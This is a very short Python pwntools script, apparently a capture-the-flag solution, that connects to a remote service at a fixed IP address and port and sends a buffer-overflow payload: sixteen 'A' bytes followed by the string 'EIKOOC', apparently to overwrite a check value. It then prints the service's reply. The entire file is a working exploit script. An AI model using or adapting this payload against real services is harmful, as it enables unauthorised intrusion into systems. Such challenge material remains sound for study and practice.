from pwn import *

def solve():
    io = remote('13.210.180.94', 10001)
    
    io.sendline("A" * 16 + "EIKOOC")
    print(io.recvrepeat(1).decode(errors="ignore"))
    
    io.close()

solve()
